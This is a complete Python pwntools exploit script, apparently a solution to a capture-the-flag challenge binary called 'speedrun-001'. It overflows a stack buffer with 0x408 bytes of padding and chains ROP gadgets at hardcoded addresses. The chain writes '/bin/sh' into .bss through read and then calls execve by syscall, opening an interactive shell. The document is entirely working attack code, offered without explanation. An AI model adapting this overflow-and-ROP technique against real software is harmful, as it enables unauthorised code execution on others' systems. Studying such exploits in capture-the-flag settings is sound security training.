from pwn import *

elf = ELF('./speedrun-001')

pop_rax_addr = 0x0000000000415664
pop_rdi_addr = 0x0000000000400686
pop_rsi_addr = 0x00000000004101f3
pop_rdx_addr = 0x00000000004498b5
syscall_addr = 0x0000000000474e65

read_addr = 0x0000000004498A0

padding = b'B' * 0x408

rop  = b''

# write to address
def write_to(address):
    rop  = b''

    # rdi = 0
    rop += p64(pop_rdi_addr)
    rop += p64(0)

    # rsi = address
    rop += p64(pop_rsi_addr)
    rop += p64(address)

    # rdx = 0x10
    rop += p64(pop_rdx_addr)
    rop += p64(0x10)

    # call read
    rop += p64(read_addr)

    return rop

# execve string command
def execve(command_ptr):
    rop  = b''

    # rdi = command_ptr
    rop += p64(pop_rdi_addr)
    rop += p64(command_ptr)

    # rsi = 0
    rop += p64(pop_rsi_addr)
    rop += p64(0)

    # rdx = 0
    rop += p64(pop_rdx_addr)
    rop += p64(0)

    # rax = 59
    rop += p64(pop_rax_addr)
    rop += p64(59)

    # syscall
    rop += p64(syscall_addr)

    return rop

command_ptr = elf.bss(0x100)

rop += write_to(command_ptr)
rop += execve(command_ptr)

payload = padding + rop

p = process('./speedrun-001')

p.sendafter(b'?\n', payload)
p.sendafter(b'\n', b'/bin/sh')

p.interactive()
